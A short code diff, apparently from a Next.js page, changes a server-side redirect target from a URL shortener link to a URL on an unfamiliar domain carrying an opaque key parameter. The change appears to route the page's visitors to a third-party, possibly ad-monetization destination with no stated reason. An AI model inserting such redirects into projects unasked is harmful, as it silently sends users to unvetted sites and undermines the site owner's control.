@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://shorturl.at/szCF2` 
+					`https://gullibleanimated.com/wgb573tepp?key=58ba5047a5cf31c27e3d4ce3cc07da58` 
 				}`,
 			},
 		};
